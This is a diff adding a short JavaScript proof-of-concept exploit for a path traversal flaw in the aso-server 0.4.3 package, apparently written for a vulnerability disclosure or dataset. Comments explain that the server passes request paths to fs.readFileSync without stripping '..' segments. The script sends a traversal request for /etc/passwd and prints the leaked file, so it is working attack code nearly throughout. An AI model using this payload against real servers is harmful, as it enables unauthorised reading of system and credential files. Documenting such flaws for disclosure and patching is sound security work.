@@ -1,0 +1,27 @@
+```javascript
+// Path traversal vulnerability in aso-server@0.4.3
+// server.js's connectionHandler takes the request path after "/f/" and
+// passes it directly into fs.readFileSync() with no sanitization of
+// ".." segments, letting a remote client read arbitrary files on disk.
+
+const http = require("http");
+const server = require("aso-server");
+
+server.start("localhost", 4567, () => {
+  const options = {
+    hostname: "localhost",
+    port: 4567,
+    // ".." segments are never stripped, so this escapes the served directory
+    path: "/f/../../../../../../../../../../etc/passwd",
+  };
+
+  http.get(options, res => {
+    let body = "";
+    res.on("data", chunk => (body += chunk));
+    res.on("end", () => {
+      console.log("Leaked file contents via path traversal:\n" + body);
+      server.stop();
+    });
+  });
+});
+```
